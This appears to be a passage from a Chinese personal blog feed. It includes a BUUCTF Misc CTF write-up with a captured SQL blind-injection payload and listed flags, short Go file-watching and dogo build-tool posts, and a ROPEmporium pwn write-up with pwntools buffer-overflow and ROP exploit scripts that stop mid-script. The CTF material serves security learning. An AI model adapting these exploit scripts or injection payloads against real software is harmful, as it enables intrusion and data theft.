使用<code>dd</code>命令手动分割出来</p><pre class=" language-shell"><code class="language-shell">dd if=ezbb.jpg of=2.zip bs=1 skip=28227</code></pre><p>解压出来发现是一个<code>.jpg</code>, 但是大小很可以, 使用file命令查看是<code>.avi</code>的视频文件, 于是改后缀 就可以播放了.<br><img src="/images/17/17.jpg" alt></p><p>视频看着看会闪过几张图片, 图片上有二维码, 用PR一帧一帧分析 + 扫描就可以了.<br><code>flag{imagin_love_Y1ng}</code></p><h2 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h2><p>wireshark分析可以找到菜刀连接的痕迹, 我这里是使用的<code>foremost</code>工具提取出来的压缩包.<br>拿到压缩包之后发现有密码, 于是又返回<code>wireshark</code>, 从<code>wireshark</code>找到了一堆16进制<br><img src="/images/17/18.jpg" alt></p><p>可以看到是<code>z2</code>参数的, 开头是<code>FFD8FF</code>, 有经验的就可以看出是<code>.jpg</code>文件的头, 于是拿出来, 保存到文件, 使用<code>xxd</code>命令将其保存成图片. 这里保存成<code>1</code></p><pre class=" language-shell"><code class="language-shell">xxd -r -p 1 > 1.jpg</code></pre><p><img src="/images/17/19.jpg" alt></p><p>图片上就是压缩包的密码, 然后解压压缩包, 得到flag<br><code>flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}</code></p><h2 id="BJDCTF-2nd-Real-EasyBaBa"><a href="#BJDCTF-2nd-Real-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]Real_EasyBaBa"></a>[BJDCTF 2nd]Real_EasyBaBa</h2><p>使用winhex打开, 发现有一个地方不太对劲…<br><img src="/images/17/20.jpg" alt><br>这里我的屏幕是60Hz的, 上下滚动会有一点点拖影, 如果你也是, 不妨也跟我一样上下滚动鼠标, 就可以隐隐约约看清楚…<code>BJD{</code>…  好, flag出来了.<br>其实也可以根据这个画一下。<br><img src="/images/17/21.jpg" alt></p><p><code>flag{572154976}</code></p><h2 id="BJDCTF-2nd-圣火昭昭-y1ng"><a href="#BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="[BJDCTF 2nd]圣火昭昭-y1ng"></a>[BJDCTF 2nd]圣火昭昭-y1ng</h2><p>图片右键属性查看到了信息<code>新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</code>.</p><p>之前见过类似的, 但是这个是<code>新佛曰</code>, 没错, 更新换代了.</p><p><a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">在线工具</a>解出了<code>gemlovecom</code>, 根据题目说明, 去掉<code>com</code>, 得到flag…..? flag不对? 继续分析.</p><p>这里要用到<code>outguess</code>, 这个东西解密需要密钥, 所以我们刚才得到的<code>gemlove</code>.<br><img src="/images/17/22.jpg" alt><br>嗯..打个Misc都有茄子啊 wdnmd。<br><code>flag{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></p><h2 id="穿越时空的思念"><a href="#穿越时空的思念" class="headerlink" title="穿越时空的思念"></a>穿越时空的思念</h2><p>一段音频文件, 右声道有摩斯电码, 使用<code>Audacity</code>分析, 得到flag<br><img src="/images/17/23.jpg" alt><br><code>flag{f029bd6f551139eedeb8e45a175b0786}</code></p><h2 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h2><p>真逆向题目, 使用IDA静态分析, 搜索字符串找到了<code>well done</code>, <code>Buff3r_0v3rf|0w</code>之类的字样, 追踪到使用这个字符串的函数中, 可以看到<br><img src="/images/17/24.jpg" alt></p><p>首先是输入长度是<code>6</code>, <code>v12</code>会被+1, 要等于<code>123</code>, 也就是先写<code>122</code>, 后面<code>120 122 121</code>,<br>也就是需要</p><pre class=" language-text"><code class="language-text">v14 = 120v15 = 121v16 = 122</code></pre><p>转换成ascii码, 正好是<code>xyz</code>, 那么加上之前的<code>122</code>, 长度也刚好吻合, 最后的payload也就是<code>122xyz</code><br><img src="/images/17/25.jpg" alt></p><p><code>flag{123_Buff3r_0v3rf|0w}</code></p><h2 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h2><p>是一段sql盲注的包, 筛选出长度最长的包, 然后分析盲注语句.</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat_ws<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">94</span><span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span> <span class="token keyword">from</span> db_flag<span class="token punctuation">.</span>tb_flag <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">101</span></code></pre><p>此时需要一点sql基础, <code>substr(&quot;test&quot;, 1,1)</code>代表第一位开始取一位, 也就是取出<code>t</code><br>那么<code>substr(&quot;test&quot;, 3, 1)</code>也就是取出<code>s</code></p><p><code>ascii</code>函数就是把取出来的内容转换成<code>ascii码</code>.</p><p>然后最后面的<code>&gt; 101</code>就是一段判断取出来的字母的ascii码是否是大于101.</p><p>那么就好办了, 直接按照这个规律挨个看也行.</p><p>因为是大于号, 所以每个字母位置的最后一个包后面的数字要 + 1, </p><p>例子上的这个是第一个字母的包, 所以第一个字母的ascii就是<code>102</code>, 转换成字符串也就是<code>f</code>.</p><p>得到所有的ascii, 并保存为<code>1.txt</code></p><pre class=" language-text"><code class="language-text">10210897103123525510110098565148481011005310257985056102995352984810048571019910010110255125</code></pre><p>写个脚本给他转出来</p><pre class=" language-python"><code class="language-python"><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> fp<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><p><img src="/images/17/26.jpg" alt></p><p><code>flag{47edb8300ed5f9b28fc54b0d09ecdef7}</code></p><h2 id="SWPU2019-神奇的二维码"><a href="#SWPU2019-神奇的二维码" class="headerlink" title="[SWPU2019]神奇的二维码"></a>[SWPU2019]神奇的二维码</h2><p>得到一个<code>二维码</code>, 扫码得到<code>swpuctf{flag_is_not_here}</code>, 看来不是这个.</p><p>于是<code>notepad++</code>打开文件, 发现最后藏了个<code>good/good.mp3</code>, 于是<code>binwalk</code>分解, 得到了一个<code>flag.jpg</code>…嗯..很嘲讽…<br><img src="/images/17/27.jpg" alt></p><p>还得到了一个<code>看看flag在不在里面^_^.rar</code>和<code>encode.txt</code>, <code>encode.txt</code>里面是一段<code>base64</code>, 解出来的内容就是这个压缩包的密码, 里面的内容还是那个<code>flag.jpg</code></p><p>也得到了一个<code>flag.doc</code>, 里面是一段很长的<code>base64</code>, 解码又得到了一个<code>base64</code>… 循环下去, 最终得到了一个.. <code>comEON_YOuAreSOSoS0great</code>, 这。。。也不像是flag啊…</p><p>嗯? 怎么回事? 怎么没有那个<code>good.mp4</code>, 于是看了看<code>binwalk</code>分解出来的其他压缩包, 发现了一个<code>18394.rar</code>,  有密码, 于是拿刚才解出的<code>comEON_YOuAreSOSoS0great</code>试了一下, 还真是… 得到了一段音频, 听声音是摩斯电码, 用<code>Audacity</code>分析出来, 拿去解码, 得到最终flag<br><code>flag{morseisveryveryeasy}</code></p><h2 id="GXYCTF2019-佛系青年"><a href="#GXYCTF2019-佛系青年" class="headerlink" title="[GXYCTF2019]佛系青年"></a>[GXYCTF2019]佛系青年</h2><p>下载下来压缩包, 解压的时候有个<code>txt</code>文件提示密码错误, 于是扔进<code>WinHEX</code>, 一看是伪加密.<br><img src="/images/17/28.jpg" alt><br>将<code>09 00</code>修改成<code>00 00</code>, 解压文件, 没有报错了, 打开<code>txt</code>文件之后发现是与佛论禅, 直接在线工具解密就可以了.</p><p><code>flag{w0_fo_ci_Be1}</code></p><hr><p>先写到这里吧，慢慢再补充辣。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BUUOJ CTF, 日常刷题记录, 包含题目flag, 以及使用的脚本. &lt;/p&gt;
&lt;p&gt;这是关于&lt;code&gt;杂项题目&lt;/code&gt;的WP, 之前写过&lt;code&gt;密码学&lt;/code&gt;的WP, 如果有需要可以转到&lt;a href=&quot;/2019/12/03/8-BUUCTF-Crypto-WriteUP/&quot;&gt;BUUCTF 密码学思路&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://helianthus.top/tags/CTF/"/>
    
      <category term="BUUCTF" scheme="https://helianthus.top/tags/BUUCTF/"/>
    
      <category term="BUUOJ" scheme="https://helianthus.top/tags/BUUOJ/"/>
    
      <category term="Misc" scheme="https://helianthus.top/tags/Misc/"/>
    
      <category term="WriteUP" scheme="https://helianthus.top/tags/WriteUP/"/>
    
  </entry>
  
  <entry>
    <title>文件监听(FileWatch)实现原理</title>
    <link href="https://helianthus.top/2020/06/01/16-Filewatch-base/"/>
    <id>https://helianthus.top/2020/06/01/16-Filewatch-base/</id>
    <published>2020-06-01T13:09:25.000Z</published>
    <updated>2020-06-01T05:30:15.952Z</updated>
    
    <content type="html"><![CDATA[<p>拿上一篇文章中提到的<code>dogo</code>为例, 它是怎么进行文件监听的呢, 如何实现一个简单的文件监听  这篇文章就带你从底层看最简单的实现原理.</p><a id="more"></a><h2 id="代码文件结构"><a href="#代码文件结构" class="headerlink" title="代码文件结构"></a>代码文件结构</h2><pre class=" language-tree"><code class="language-tree">├─fileWatch│  ├─.idea│  └─folder│  main.go</code></pre><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>把要监听的文件目录取 <code>最后一次的更改时间</code> 和 <code>当前大小</code>, 这两个值的类型都是<code>int64</code>, 然后进行<code>异或</code>, 这样无论是哪个值发生了更改, 最后的异或结果都会进行变化, 就可以看出这个目录是否被操作了.</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p><strong>main.go</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"os"</span>    <span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">var</span> <span class="token punctuation">(</span>    FolderName <span class="token operator">=</span> <span class="token string">"C:\\Users\\Administrator\\Desktop\\fileWatch\\folder"</span>    LastValue <span class="token builtin">int64</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">{</span>        info<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Stat</span><span class="token punctuation">(</span>FolderName<span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>            <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"文件夹可能不存在."</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        nowValue <span class="token operator">:=</span> info<span class="token punctuation">.</span><span class="token function">ModTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Unix</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> info<span class="token punctuation">.</span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> nowValue <span class="token operator">!=</span> LastValue <span class="token punctuation">{</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"文件夹发生更改"</span><span class="token punctuation">)</span>            LastValue <span class="token operator">=</span> nowValue        <span class="token punctuation">}</span>        time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 如果不Sleep, 会特别占用CPU</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/images/16/1.gif" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;拿上一篇文章中提到的&lt;code&gt;dogo&lt;/code&gt;为例, 它是怎么进行文件监听的呢, 如何实现一个简单的文件监听  这篇文章就带你从底层看最简单的实现原理.&lt;/p&gt;
    
    </summary>
    
    
      <category term="Golang" scheme="https://helianthus.top/categories/Golang/"/>
    
    
      <category term="Golang" scheme="https://helianthus.top/tags/Golang/"/>
    
      <category term="FileWatch" scheme="https://helianthus.top/tags/FileWatch/"/>
    
      <category term="Base" scheme="https://helianthus.top/tags/Base/"/>
    
  </entry>
  
  <entry>
    <title>Dogo目录监听自动构建工具</title>
    <link href="https://helianthus.top/2020/05/31/15-golang-dogo-filelisten/"/>
    <id>https://helianthus.top/2020/05/31/15-golang-dogo-filelisten/</id>
    <published>2020-05-30T17:00:50.000Z</published>
    <updated>2020-05-30T09:25:01.929Z</updated>
    
    <content type="html"><![CDATA[<p><code>dogo</code>是一个使用<code>Go</code>语言编写的自动化构建工具, 可以实时监听目录, 发生更改时就自动执行特定命令。</p><p>Github: <a href="https://github.com/liudng/dogo" target="_blank" rel="noopener">https://github.com/liudng/dogo</a></p><a id="more"></a><h2 id="下载并编译"><a href="#下载并编译" class="headerlink" title="下载并编译"></a>下载并编译</h2><pre class=" language-shell"><code class="language-shell">git clone https://github.com/liudng/dogo.gitcd dogogo mod init dogogo build</code></pre><p>我使用的是<code>windows</code>系统, 执行完上面的命令之后会生成一个<code>dogo.exe</code>.</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>目前有个需求<br>我的工作(源码)目录: <code>C:\\Users\\Administrator\\Desktop\\testSource</code><br>需要监听的文件类型: <code>.go</code><br>监听到更改需要执行的命令: <code>go build -o main.exe</code><br>并且<code>build</code>出来之后还要执行这个<code>main.exe</code>  </p><p>配置文件就可以这样写:</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"WorkingDir"</span><span class="token operator">:</span> <span class="token string">"C:\\Users\\Administrator\\Desktop\\testSource"</span><span class="token punctuation">,</span>  <span class="token property">"SourceDir"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"C:\\Users\\Administrator\\Desktop\\testSource"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"SourceExt"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">".go"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"BuildCmd"</span><span class="token operator">:</span> <span class="token string">"go build -o main.exe"</span><span class="token punctuation">,</span>  <span class="token property">"RunCmd"</span><span class="token operator">:</span> <span class="token string">"main.exe"</span><span class="token punctuation">,</span>  <span class="token property">"Decreasing"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span></code></pre><h2 id="看看效果"><a href="#看看效果" class="headerlink" title="看看效果?"></a>看看效果?</h2><p><img src="/images/15/1.gif" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;dogo&lt;/code&gt;是一个使用&lt;code&gt;Go&lt;/code&gt;语言编写的自动化构建工具, 可以实时监听目录, 发生更改时就自动执行特定命令。&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&quot;https://github.com/liudng/dogo&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/liudng/dogo&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Tools" scheme="https://helianthus.top/categories/Tools/"/>
    
    
      <category term="golang" scheme="https://helianthus.top/tags/golang/"/>
    
      <category term="watch" scheme="https://helianthus.top/tags/watch/"/>
    
      <category term="dogo" scheme="https://helianthus.top/tags/dogo/"/>
    
  </entry>
  
  <entry>
    <title>【CTF-PWN】ROPEmporium</title>
    <link href="https://helianthus.top/2020/05/28/14-CTF-PWN-ROPEmporiumWriteUP/"/>
    <id>https://helianthus.top/2020/05/28/14-CTF-PWN-ROPEmporiumWriteUP/</id>
    <published>2020-05-28T09:17:06.000Z</published>
    <updated>2020-06-16T12:59:54.073Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下学习ROP的基础题目.</p><a id="more"></a><hr><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h5 id="32位"><a href="#32位" class="headerlink" title=" 32位:"></a><a href="https://ropemporium.com/binary/ret2win32.zip" target="_blank" rel="noopener"> 32位</a>:</h5><p>先分析一下程序, 可以看到<code>main</code>、<code>pwnme</code>、<code>ret2win</code>函数.<br><code>main</code>函数调用了<code>pwnme</code>函数, <code>pwnme</code>函数里面存在一个<code>gets</code>读取<code>0x32</code>个字节到<code>s</code>变量里面, 但是这个变量只有<code>0x28</code>大小. 也就是<code>0x28</code> + <code>4</code> + <code>retaddr</code>就可以控制这个程序的返回地址了.<br><img src="/images/14/ret2win/1.jpg" alt></p><p>废话不多说 直接上exp.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2win32"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>ret2win_addr <span class="token operator">=</span> <span class="token number">0x08048659</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>ret2win_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/ret2win/2.jpg" alt></p><h5 id="64位"><a href="#64位" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/ret2win.zip" target="_blank" rel="noopener">64位</a>:</h5><p>虽然是<code>64</code>位的, 但是这个题目不需要进行<code>rop</code>, 所以和<code>32</code>位的做法一样.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2win"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>   <span class="token comment" spellcheck="true"># because is 64 bit program, +8</span>ret2win_addr <span class="token operator">=</span> <span class="token number">0x0000000000400811</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret2win_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/ret2win/3.jpg" alt></p><hr><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h5 id="32位-1"><a href="#32位-1" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/split32.zip" target="_blank" rel="noopener">32位</a>:</h5><p><code>main</code>、<code>pwnme</code>函数都和上道题差不多, 但是<code>usefulFunction</code>里面只有一条<code>system(&quot;/bin/ls&quot;)</code>, 并不是<code>cat /flag</code>, 不过可以通过<code>IDA</code>里面<code>shift+F12</code>, 搜索到<code>/bin/cat flag.txt</code>, 也就是<code>system</code>函数和<code>/bin/cat flag.txt</code>并不在连续的内存位置, 所以需要构造一下 :D<br><img src="/images/14/split/1.jpg" alt></p><p>接下来就要用到汇编中, 调用函数的原理. 如果不懂的可以看我之前拍过的一期视频.<br><a href="https://www.bilibili.com/video/BV1DE411y7nR" target="_blank" rel="noopener">【x86汇编】详解汇编调用函数三步，加恢复堆栈平衡</a></p><p>开始写exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./split32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./split32"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>cat_flag_addr <span class="token operator">=</span> <span class="token number">0x0804A030</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>cat_flag_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/split/2.jpg" alt></p><h5 id="64位-1"><a href="#64位-1" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/split.zip" target="_blank" rel="noopener">64位</a>:</h5><p>64位调用函数参数寄存器: <code>rdi, rsi, rdx, rcx, r8, r9</code><br>从这里开始, 我们第一次接触<code>gadget</code>, 什么是<code>gadget</code>呢, 就是程序中存在的一些小汇编指令,<br>比如<code>pop rdi; ret</code>, <code>pop rsi; ret</code>, <code>mov r12, 13; ret</code>, 有没有发现什么规律, 每个汇编指令结尾都是<code>ret</code>, 所以是<code>ROP</code> <code>Return-Oriented Programming</code>, 可以通过找到多个<code>gadget</code>, 最后组成一段长的<code>链</code>, 以完成我们的攻击.</p><p>在我们安装完毕<code>pwntools</code>之后, 会有一个工具<code>ROPgadget</code>, 它可以很方便的找到我们攻击所需要的<code>gadget</code>.</p><p>64位程序调用函数的时候, 函数的前6个参数是存在于寄存器当中的, 所以我们需要把<code>/bin/cat flag.txt</code>放到第一个参数的位置, 也就是需要找到<code>pop rdi; ret</code></p><p>找<code>pop rdi; ret</code></p><pre class=" language-shell"><code class="language-shell">ROPgadget --binary split --only "pop|ret"</code></pre><p>可以找到<code>0x0000000000400883 : pop rdi ; ret</code>, 已经可以开始写exp了.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./split"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./split"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var </span>overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x0000000000400883</span>cat_flag_addr <span class="token operator">=</span> <span class="token number">0x0000000000601060</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cat_flag_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/split/3.jpg" alt></p><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h5 id="32位-2"><a href="#32位-2" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/callme32.zip" target="_blank" rel="noopener">32位</a>:</h5><p>这道题目是为了加深函数调用的理解<br>题目说需要依次调用<code>callme_one(), callme_two() , callme_three()</code>三个函数, 每个函数都需要传递<code>1 2 3</code>三个参数. 也就是<code>func(1, 2, 3)</code></p><p>需要通过<code>ROPgadget</code>找到一个可以删除栈上三个参数的<code>gadget</code>, 以恢复栈平衡.</p><p>要注意, <code>callme_one, callme_two</code>等函数地址要取<code>函数本身</code>的, 而不是<code>call callme_one</code>之类的地址.</p><p>开始写exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./callme32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./callme32"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>callme_one_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_one"</span><span class="token punctuation">]</span>callme_two_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_two"</span><span class="token punctuation">]</span>callme_three_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_three"</span><span class="token punctuation">]</span>pop_esi_rdi_rbp_ret <span class="token operator">=</span> <span class="token number">0x080488a9</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>callme_one_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_esi_rdi_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>callme_two_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_esi_rdi_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>callme_three_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_esi_rdi_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/callme/1.jpg" alt></p><h5 id="64位-2"><a href="#64位-2" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/callme.zip" target="_blank" rel="noopener">64位</a>:</h5><p>emm, 这个题目, 64位个人感觉要更简单一些, 专心找<code>gadget</code>就可以了.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./callme"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./callme"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>callme_one_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_one"</span><span class="token punctuation">]</span>callme_two_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_two"</span><span class="token punctuation">]</span>callme_three_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_three"</span><span class="token 